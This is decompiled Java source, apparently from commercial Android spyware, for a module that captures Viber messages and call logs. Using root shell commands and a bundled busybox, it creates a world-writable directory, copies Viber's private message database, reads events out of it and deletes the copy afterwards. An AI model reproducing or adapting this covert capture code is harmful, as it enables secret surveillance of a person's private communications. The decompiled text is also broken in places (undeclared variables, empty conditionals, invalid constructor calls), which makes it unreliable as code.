package com.vvt.capture.viber.a.a.a.b;

import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import com.vvt.capture.viber.mode.full.c;
import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.KMShell.ShellException;
import com.vvt.shell.ShellUtil;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class b
  implements f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private String c;
  private com.vvt.base.b d;
  
  public b(String paramString, com.vvt.base.b paramb)
  {
    this.c = paramString;
    this.d = paramb;
  }
  
  private String a(String paramString1, String paramString2)
  {
    String str1 = p.a(paramString1, "viber_messages");
    String str2 = c();
    String str3 = p.a(str2, "viber_messages");
    Object localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
    int i = 5;
    try
    {
      Object[] arrayOfObject = new Object[i];
      int j = 0;
      String str4 = null;
      arrayOfObject[0] = str2;
      j = 1;
      arrayOfObject[j] = str2;
      j = 2;
      arrayOfObject[j] = paramString2;
      j = 3;
      arrayOfObject[j] = paramString2;
      j = 4;
      arrayOfObject[j] = str2;
      localObject = String.format((String)localObject, arrayOfObject);
      KMShell.a((String)localObject);
      boolean bool1 = com.vvt.aa.a.c();
      if (bool1) {
        ShellUtil.k(str2);
      }
      str2 = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
      int k = 7;
      localObject = new Object[k];
      i = 0;
      arrayOfObject = null;
      str4 = b();
      localObject[0] = str4;
      i = 1;
      localObject[i] = str1;
      int m = 2;
      localObject[m] = str3;
      m = 3;
      localObject[m] = str3;
      m = 4;
      localObject[m] = paramString2;
      m = 5;
      localObject[m] = paramString2;
      m = 6;
      localObject[m] = str3;
      str1 = String.format(str2, (Object[])localObject);
      KMShell.a(str1);
      bool2 = com.vvt.aa.a.c();
      if (bool2) {
        ShellUtil.k(str3);
      }
      bool2 = a;
      if (!bool2) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool2 = b;
        if (!bool2) {}
      }
    }
    return str3;
  }
  
  private String b()
  {
    return p.a(this.c, "busybox");
  }
  
  private String c()
  {
    return p.a(this.c, "viber_calllog");
  }
  
  private void d()
  {
    String str1 = c();
    String str2 = "rm -r %s";
    int i = 1;
    try
    {
      Object[] arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      str1 = String.format(str2, arrayOfObject);
      KMShell.a(str1);
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
  }
  
  public g a()
  {
    boolean bool1 = a;
    if (bool1) {}
    long l = -1;
    try
    {
      localObject1 = com.vvt.capture.viber.mode.a.a.a();
      if (localObject1 != null)
      {
        Object localObject2 = this.d;
        localObject2 = ((com.vvt.base.b)localObject2).f();
        localObject1 = a((String)localObject1, (String)localObject2);
        boolean bool2 = com.vvt.ag.b.a((String)localObject1);
        if (!bool2) {
          l = com.vvt.capture.viber.a.a.b.a((String)localObject1);
        }
        d();
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Long localLong;
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    localObject1 = new com/vvt/base/capture/FxSimpleEventReference;
    ((FxSimpleEventReference)localObject1).<init>();
    localLong = Long.valueOf(l);
    ((FxSimpleEventReference)localObject1).setReference(localLong);
    bool1 = a;
    if (bool1) {}
    return (g)localObject1;
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = com.vvt.capture.viber.mode.a.a.a();
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        if (i > 0)
        {
          Object localObject2 = this.d;
          localObject2 = ((com.vvt.base.b)localObject2).f();
          localObject1 = a((String)localObject1, (String)localObject2);
          boolean bool2 = a;
          if (bool2) {}
          bool2 = com.vvt.ag.b.a((String)localObject1);
          if (!bool2)
          {
            long l1 = c.a((String)localObject1);
            long l2 = c.a((String)localObject1, paramInt);
            long l3 = 1L;
            l2 -= l3;
            localObject1 = com.vvt.capture.viber.a.a.b.a((String)localObject1, l2, l1);
            localArrayList.addAll((Collection)localObject1);
            bool3 = a;
            if (!bool3) {}
          }
          d();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool3 = b;
        if (!bool3) {}
      }
    }
    bool3 = a;
    if (bool3) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool1 = a;
    if (bool1) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    bool1 = paramg1 instanceof FxSimpleEventReference;
    if (bool1)
    {
      bool1 = paramg2 instanceof FxSimpleEventReference;
      if (!bool1) {}
    }
    try
    {
      Object localObject1 = ((g)paramg1).getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      localObject1 = ((g)paramg2).getReference();
      localObject1 = (Long)localObject1;
      long l2 = ((Long)localObject1).longValue();
      localObject1 = com.vvt.capture.viber.mode.a.a.a();
      if (localObject1 != null)
      {
        int i = ((String)localObject1).length();
        if (i > 0)
        {
          Object localObject2 = this.d;
          localObject2 = ((com.vvt.base.b)localObject2).f();
          localObject1 = a((String)localObject1, (String)localObject2);
          boolean bool2 = a;
          if (bool2) {}
          localObject1 = com.vvt.capture.viber.a.a.b.a((String)localObject1, l1, l2);
          localArrayList.addAll((Collection)localObject1);
          bool1 = a;
          if (bool1) {}
          d();
        }
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool1 = b;
        if (!bool1) {}
      }
    }
    bool1 = a;
    if (bool1) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/viber/a/a/a/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */